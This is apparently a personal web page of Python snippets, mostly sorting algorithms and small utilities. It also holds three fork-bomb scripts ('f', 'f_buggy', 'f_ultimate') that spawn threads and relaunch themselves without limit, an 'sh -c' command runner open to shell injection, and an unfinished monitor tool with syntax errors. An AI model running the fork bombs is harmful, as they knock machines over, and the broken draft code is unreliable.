<html>
<head>
<title>Python_misc</title>
<link rel="stylesheet" href="prism.css">
</head>
<body bgcolor="#F5F2F0" link="#1F00FF" vlink="#1F00FF">
<br>
<ul>
<li><a href="#0">insertion sort</a></li>
<li><a href="#1">code_golf_palindrome_letters_only</a></li>
<li><a href="#2">__name__=__main__</a></li>
<li><a href="#3">f</a></li>
<li><a href="#4">infix_to_postfix_new</a></li>
<li><a href="#5">f_buggy</a></li>
<li><a href="#6">gtk_theme_change_reload</a></li>
<li><a href="#7">SimpleHTTPServer_pyftpdlib</a></li>
<li><a href="#8">check_if_port_open</a></li>
<li><a href="#9">f_ultimate</a></li>
<li><a href="#10">shell_sort</a></li>
<li><a href="#11">bubble sort</a></li>
<li><a href="#12">autocomplete_example</a></li>
<li><a href="#13">aufbau</a></li>
<li><a href="#14">MonitoTileX</a></li>
<li><a href="#15">run_command</a></li>
<li><a href="#16">quicksort</a></li>
</ul>
<br><br>
<a id="0"></a>
<br><br>
insertion sort<br>
<pre>
<code class=" language-python">## insertion sort


def insertion(l):
    for i in range(1, len(l)):
        for j in range(i, 0, -1):
            if l[j] >= l[j - 1]:
                break
            l[j], l[j - 1] = l[j - 1], l[j]
    return l


# print(insertion([int(x) for x in input("Enter the list of numbers separated by spaces: ").split()]))


def foo(l):
    l = insertion(l)
    for i in range(len(l)):
        if l[i] == int(l[i]):
            l[i] = int(l[i])
    return l


print(foo([float(x) for x in input("Enter the values separated by spaces: ").split()]))
<br>
</code>
</pre>
<a id="1"></a>
<br><br>
code_golf_palindrome_letters_only<br>
<pre>
<code class=" language-python">## Source: https://stringlabs.io/codegolf/challenge/palindromicallyspeaking

""" Write a function called hannah that takes in a string and returns
    whether or not the letters (and only the letters) in that sentence are a palindrome (case insensitive).
    Your function should return a boolean.  """

## Best submission: 70 bytes
## My answer: 68 bytes


def hannah(s):
    l = [x for x in s if x.isalpha()]
    return l == l[::-1]
<br>
</code>
</pre>
<a id="2"></a>
<br><br>
__name__=__main__<br>
<pre>
<code class=" language-python">if __name__ == "__main__":
    print("Executed when invoked directly")
else:
    print("Executed when imported")

print("Always executed")
<br>
</code>
</pre>
<a id="3"></a>
<br><br>
f<br>
<pre>
<code class=" language-python">##  Simple and effective(?)
##  Cheers  :D

import threading as t


def f():
    while True:
        t.Thread(target=f).start()
        f()


f()
<br>
</code>
</pre>
<a id="4"></a>
<br><br>
infix_to_postfix_new<br>
<pre>
<code class=" language-python">#!/bin/python3
import tabulate


def infix_postfix_non_boolean(input_infix):
    table_list = []
    if not isinstance(input_infix, str):
        raise TypeError("This function takes only string as argument")
    input_char_list = [char for char in input_infix if not char.isspace()]
    output = ""
    stack = ["("]
    table_list.append(["start", str(stack), output])
    for char in input_char_list:
        if char.isalnum():
            output += char
        elif char in "()*^/+-":
            if char == ")":
                while True:
                    stack_char = stack.pop()
                    if stack_char == "(":
                        break
                    output += stack_char
            elif char == "(":
                stack.append(char)
            elif char in "+-":
                while True:
                    stack_char = stack.pop()
                    if stack_char == "(":
                        stack.append(stack_char)
                        break
                    output += stack_char
                stack.append(char)
            elif char in "*/":
                while True:
                    stack_char = stack.pop()
                    if stack_char in "(+-":
                        stack.append(stack_char)
                        break
                    output += stack_char
                stack.append(char)
            elif char in "^":
                stack.append(char)
            else:
                raise RuntimeError("Unknown Operator")
        else:
            raise ("Unknown character")
        table_list.append(["'" + char + "'", str(stack), output])
    char = ""
    while len(stack) > 1:
        stack_char = stack.pop()
        output += stack_char
        table_list.append(["end", str(stack), output])
    table = tabulate.tabulate(table_list)
    print(table)


def infix_postfix_boolean(input_infix):
    table_list = []
    if not isinstance(input_infix, str):
        raise TypeError("This function takes only string as argument")
    input_word_list = input_infix.split()
    output = ""
    stack = ["("]
    table_list.append(["start", str(stack), output])
    for word in input_word_list:
        if word not in ("NOT", "AND", "OR", "(", ")"):
            output += word + " "
        elif word in ("NOT", "AND", "OR", "(", ")"):
            if word == ")":
                while True:
                    stack_word = stack.pop()
                    if stack_word == "(":
                        break
                    output += stack_word + " "
            elif word == "(":
                stack.append(word)
            elif word in ("AND", "OR"):
                while True:
                    stack_word = stack.pop()
                    if stack_word in "(":
                        stack.append(stack_word)
                        break
                    output += stack_word + " "
                stack.append(word)
            elif word == "NOT":
                stack.append(word)
            else:
                raise RuntimeError("Unknown Operator")
        else:
            raise ("Unknown operator")
        table_list.append(["'" + word + "'", str(stack), output])
    word = ""
    while len(stack) > 1:
        stack_word = stack.pop()
        output += stack_word + " "
        table_list.append(["end", str(stack), output])
    table = tabulate.tabulate(table_list)
    print(table)


if __name__ == "__main__":
    try:
        while True:
            input_str = input("> ")
            for check in ("AND", "OR", "NOT"):
                if check in input_str.upper():
                    infix_postfix_boolean(input_str)
                    break
            else:
                infix_postfix_non_boolean(input_str)
    except (EOFError, KeyboardInterrupt):
        print()
        exit(0)
<br>
</code>
</pre>
<a id="5"></a>
<br><br>
f_buggy<br>
<pre>
<code class=" language-python">import os, threading as t


def f():
    while True:
        os.system("python f_buggy.py")
        t.Thread(target=f).start()
        f()


f()
<br>
</code>
</pre>
<a id="6"></a>
<br><br>
gtk_theme_change_reload<br>
<pre>
<code class=" language-python">import shutil
import subprocess
import os
import tempfile

"""Runs xsettingsd for a short time to reload gtk3 theme"""
if shutil.which("xsettingsd"):
    fd, path = tempfile.mkstemp()
    try:
        with os.fdopen(fd, "w+") as tmp:
            tmp.write('Net/ThemeName "Layan-dark"\n')
            tmp.close()
            subprocess.Popen.wait(
                subprocess.Popen(["timeout", "0.2s", "xsettingsd", "-c", path])
            )
    finally:
        os.remove(path)
<br>
</code>
</pre>
<a id="7"></a>
<br><br>
SimpleHTTPServer_pyftpdlib<br>
<pre>
<code class=" language-python">#  This is not actually a Python program
#  But it is, undeniably, an amazing piece of code
#
#  At the terminal, cd into the folder you want
#  run the following command
#
#  python -m http.server 8080
#
#  then, it will set up a simple HTTP server on port 8080
#  sharing the contents of the folder
#
#  Explanation of the code -
#
#  This command executes Python
#  and imports the embedded Python2 module SimpleHTTPServer
#  which runs an HTTP server on port 8080 of the machine
#  on the directory this code is executed in
#
#  Simple way to quickly send some files :D
#
#  P.S. For sending larger files,
#  it is better to use a server having 'range' support
#  So, do this -
#       pip install rangehttpserver
#  Then, run - python -m RangeHTTPServer
#  Note: It will ONLY serve on the port 8000
#
#  also, for ftp server
#
#  pip install pyftpdlib
#  python -m pyftpdlib --help
#
#  see the help and configure as required :D
<br>
</code>
</pre>
<a id="8"></a>
<br><br>
check_if_port_open<br>
<pre>
<code class=" language-python">def is_port_in_use(port):
    import socket

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        return s.connect_ex(("localhost", port)) == 0
<br>
</code>
</pre>
<a id="9"></a>
<br><br>
f_ultimate<br>
<pre>
<code class=" language-python">import os, sys, threading


def f():
    while True:
        os.system("python " + os.path.abspath(sys.argv[0]))
        threading.Thread(target=f).start()
        f()


f()
<br>
</code>
</pre>
<a id="10"></a>
<br><br>
shell_sort<br>
<pre>
<code class=" language-python">## shell_sort


def insertion(l, step):
    for i in range(1, len(l), step):
        for j in range(i, 0, -step):
            if l[j] >= l[j - step]:
                break
            l[j], l[j - step] = l[j - step], l[j]
    return l


def control(l):
    step = len(l) // 2
    while True:
        if step < 1:
            break
        l = insertion(l, step)
        step -= 1
    return l


# print(control([int(x) for x in input("Enter the list of numbers separated by spaces: ").split()]))


def foo(l):
    l = control(l)
    for i in range(len(l)):
        if l[i] == int(l[i]):
            l[i] = int(l[i])
    return l


print(foo([float(x) for x in input("Enter the values separated by spaces: ").split()]))
<br>
</code>
</pre>
<a id="11"></a>
<br><br>
bubble sort<br>
<pre>
<code class=" language-python">## bubble sort


def bubble(l):
    for i in range(len(l), 1, -1):
        for j in range(1, i):
            if l[j - 1] > l[j]:
                l[j], l[j - 1] = l[j - 1], l[j]
    return l


# print(bubble([int(x) for x in input("Enter the list of numbers separated by spaces: ").split()]))


def foo(l):
    l = bubble(l)
    for i in range(len(l)):
        if l[i] == int(l[i]):
            l[i] = int(l[i])
    return l


print(foo([float(x) for x in input("Enter the values separated by spaces: ").split()]))
<br>
</code>
</pre>
<a id="12"></a>
<br><br>
autocomplete_example<br>
<pre>
<code class=" language-python">import readline

addrs = ["angela@domain.com", "michael@domain.com", "david@test.com"]


def completer(text, state):
    options = [x for x in addrs if x.startswith(text)]
    try:
        return options[state]
    except IndexError:
        return None


readline.set_completer(completer)
readline.parse_and_bind("tab: complete")

while 1:
    a = input("> ")
    print("You entered", a)
<br>
</code>
</pre>
<a id="13"></a>
<br><br>
aufbau<br>
<pre>
<code class=" language-python"># Aufbau
class Aufbau:
    def __init__(self, args=None):
        if args is not None:
            self.update_input(args)

    def update_input(self, args=None):
        if args is not None:
            if isinstance(args, str):
                self.global_orbital_list = args
                self.generate_from_orbital_list()
            if isinstance(args, int):
                self.global_last_orbit = args
                self.generate_from_last_orbit()

    def generate_from_orbital_list(self, orbital_list=None):
        if not orbital_list:
            try:
                orbital_list = self.global_orbital_list
            except NameError:
                raise NameError("Orbital list not defined")
        orbit_list = [None]
        for orbit_no in range(1, 2 * len(orbital_list) + 1):
            orbit_list.append(str(orbit_no))
        self.global_orbit_list = orbit_list
        self.generate_output()

    def generate_from_last_orbit(self, last_orbit=None):
        if not last_orbit:
            try:
                last_orbit = self.global_last_orbit
            except NameError:
                raise NameError("Last orbit number not specified")
        if last_orbit not in range(1, 25):
            print("Last orbit must be an integer from 1 to 24")
            return
        if last_orbit % 2 != 0:
            print(
                """WARNING: Provided outermost orbital number is odd
Rounding off to next even number ..."""
            )
        last_orbit = (last_orbit + 1) // 2
        self.global_orbital_list = "spdfghijklmnopqrstuvwxyz"[:last_orbit]
        self.generate_from_orbital_list()

    def generate_output(self):
        orbital_list = self.global_orbital_list
        orbit_list = self.global_orbit_list
        return_list = []
        for current_energy in range(1, 2 * len(orbital_list) + 1):
            for current_orbit_energy in range(len(orbit_list)):
                for current_orbital_energy in range(current_orbit_energy):
                    if current_orbit_energy + current_orbital_energy == current_energy:
                        return_list.append(
                            orbit_list[current_orbit_energy]
                            + orbital_list[current_orbital_energy]
                        )
                        break
                    else:
                        continue
                    break
        self.global_output = return_list

    def print_list(self):
        for orbital in self.global_output:
            print(orbital)

    def print_chart(self):
        for orbit in self.global_orbit_list:
            for orbital in self.global_output:
                if orbital[:-1] == str(orbit):
                    if (len(self.global_orbit_list[-1]) > 1) & (len(orbital) < 3):
                        print("0" + orbital, end=" ")
                    else:
                        print(orbital, end=" ")
            if orbit and int(orbit) > len(self.global_orbital_list):
                print("...", end=" ")
            print()
        print()


def main(user_object):
    print(
        """What do you have?
1. Orbital List
2. Last Orbit number"""
    )
    user_input = input("Enter your option: ")
    if user_input not in ("1", "2"):
        print("Invalid option!")
        return
    if user_input == "1":
        user_input = input(
            "Please enter the order of the orbitals WITHOUT whitespace: "
        )
    elif user_input == "2":
        user_input = input("Please enter the last orbit number: ")
        if not user_input.isalnum():
            print("Invalid number")
            return
        user_input = int(user_input)
    user_object.update_input(user_input)
    print(
        """What do you want to print?
1. Aufbau Chart
2. Aufbau List"""
    )
    user_input = input("Enter your option: ")
    if user_input not in ("1", "2"):
        print("Invalid option!")
        return
    if user_input == "1":
        user_object.print_chart()
    elif user_input == "2":
        user_object.print_list()


if __name__ == "__main__":
    user_object = Aufbau()
    print("To quit, press Ctrl-C anytime")
    while True:
        try:
            main(user_object)
        except (KeyboardInterrupt, EOFError):
            print("\nExiting ...")
            break
<br>
</code>
</pre>
<a id="14"></a>
<br><br>
MonitoTileX<br>
<pre>
<code class=" language-python">## MonitoTileX
## Yes, the X stands for X

def run(command):
    from subprocess import PIPE,Popen
    process=Popen(["sh","-c",command],stdout=PIPE,stderr=PIPE,text=True)
    stdout,stderr=process.communicate()
    exitcode=process.returncode
    return {'stdout':stdout,'stderr':stderr,'exitcode':exitcode}

def get_loginid():
    for string in run("loginctl")['stdout'].lower().split('\n'):
        if string.find(getlogin()) != -1 & string.find("tty") == -1:
            return string.split()[0]
    else:
        print("No non-tty logins of this user has been found. Please login into a X session.")
        exit(1)

def get_session_type():
    return run("loginctl show-session "+get_loginid()+" -p Type")['stdout'].split('=')[1].split('\n')[0]

def check_xrandr():
    xrandr_code = run("xrandr")['exitcode']
    if xrandr_code == 0: return True
    elif xrandr_code == 127: print("command 'xrandr' not found \nPlease install the package which includes this command")
    elif xrandr_code == 1: print("xrandr exited with exit code 1\nAre you on a X session? This program only runs inside an X session")
    else: print("Unknown error while running 'xrandr'")
    exit(1)

def check_readline():
    try: import readline
    except ModuleNotFoundError:
        exitcode = run("python -m pip install readline")['exitcode']
        if exitcode != 0: print("Module 'readline' was not found. Please install."); exit(1); return False
    return True

def check():
   if (tuple(version_info)[0]==3) & (platform=='linux') & (get_session_type()=='x11') & check_xrandr() & check_readline():
        return True
   else:
        if tuple(version_info)[0]!=3: print("Python v3 needed")
        elif platform != 'linux': print("Only linux is supported")
        elif get_session_type()=='wayland': print("Wayland is not supported")
        elif get_session_type()!="x11": print("Needs X11 session")
        elif not check_xrandr(): pass
        else: print("Unknown error")
        return False


def my_completer_helper(inputText,commands,loopState):
    matchList = [x for x in commands if x.startswith(inputText)]

    if len(matchList)==0:
        if loopState > 0: return None
        for l in range(1,len(inputText)):
            matches = [x for x in commands if x.startswith(inputText[:-l])]
            if len(matches) > 0:
                return matches[0]+' '

    if len(matchList)==1:
        if loopState==0: return matchList[0]+' '
        else: return None

    else:
        try: return matchList[loopState]
        except IndexError: return None




def my_completer_function(inputText, loopState):
    firstCommands = ['do','orient','status','quit']
    monitors = [ x for x in run("xrandr -q | grep ' connected' | cut -d' ' -f1")['stdout'].split('\n') if len(x) > 0 ]
    directionOf = [ 'left', 'right', 'top', 'bottom' ]
    alignTo = {
                'left':('top', 'bottom'),
                'right':('top', 'bottom'),
                'top':('left', 'right'),
                'bottom':('left', 'right')
              }
    if inputText.count(' ') == 0:
        return my_completer_helper(inputText,firstCommands,loopState)
    if inputText.count(' ') == 1:
        firstCommand = inputText.split()[0]
        availableCommands =
        return my_completer_helper(,monitors,loopState)


def currentlyConnected(monitors):
    return "Currently connected monitors are: "+monitorListToString(monitors)

def monitorListToString(monitors):
    monitorString = ""
    for x in monitors:
        monitorString += x + " "
    return monitorString





def main_loop():
    userInput = input('\n> ')
    monitors = [ x for x in run("xrandr -q | grep ' connected' | cut -d' ' -f1")['stdout'].split('\n') if len(x) > 0 ]



    if userInput == "status":
        print(currentlyConnected(monitors))
    if userInput in ("quit","q"):
        return False
    return True

def main():
    if not check(): print("Unknown Error"); exit(1); return False
    import readline
    readline.set_completer(my_completer_function)
    readline.parse_and_bind("tab: complete")
    monitors = [ x for x in run("xrandr -q | grep ' connected' | cut -d' ' -f1")['stdout'].split('\n') if len(x) > 0 ]
    print("""Welcome to Monitotilex!
Enter 'q' or 'quit' to exit
{}
To get this list of connected monitors, run 'status' anytime

Valid commands are of the syntax:
    do <monitor-name-1> <left|right|top|bottom> <monitor-name-2> <aligned-to-side>
    orient <monitor-name> <normal|left-side-down|right-side-down|upside-down>
And are interpreted as:
    <monitor-name-1> is <left|right|top|bottom> of <monitor-name-2> and aligned to the <aligned-to-side> side of <monitor-name-2>
    <monitor-name> has been kept in the position <normal|left-side-down|right-side-down|upside-down>. So adjust the display accordingly.

P.S.: Tab-completion is available at every step""".format(currentlyConnected(monitors)))
    loop = True
    while loop:
        loop = main_loop()
    exit(0)




try: from sys import version_info,platform; from os import getlogin
except ModuleNotFoundError: print("Please ensure that the following modules are available:\nsys, os"); exit(1)
else: pass

if (__name__=="__main__") & check(): main()


# To-do
""" wrong command -> suggest
command interpreter -> input().split()
main logic
mirror command (mirror <mon1> <mon2>)
"""
<br>
</code>
</pre>
<a id="15"></a>
<br><br>
run_command<br>
<pre>
<code class=" language-python"># Used to run commands input as a single string using "sh -c"


def run(command):
    from subprocess import PIPE, Popen

    process = Popen(["sh", "-c", command], stdout=PIPE, stderr=PIPE, text=True)
    stdout, stderr = process.communicate()
    exitcode = process.returncode
    return {"stdout": stdout, "stderr": stderr, "exitcode": exitcode}
<br>
</code>
</pre>
<a id="16"></a>
<br><br>
quicksort<br>
<pre>
<code class=" language-python">## quicksort


def quicksort(l):
    if len(l) > 1:
        p = l[0]  # pivot
        less = []
        more = []
        i = 0
        while True:
            try:
                if l[i] < p:
                    less.append(l.pop(i))
                if l[i] > p:
                    more.append(l.pop(i))
                if l[i] == p:
                    i += 1
            except IndexError:
                break
        less = quicksort(less)
        more = quicksort(more)
        l = less + l + more
    return l


# print(quicksort([int(x) for x in input("Enter the list of numbers separated by spaces: ").split()]))


def foo(l):
    l = quicksort(l)
    for i in range(len(l)):
        if l[i] == int(l[i]):
            l[i] = int(l[i])
    return l


print(foo([float(x) for x in input("Enter the values separated by spaces: ").split()]))
<br>
</code>
</pre>
<script src="prism.js"></script>
</body>
</html>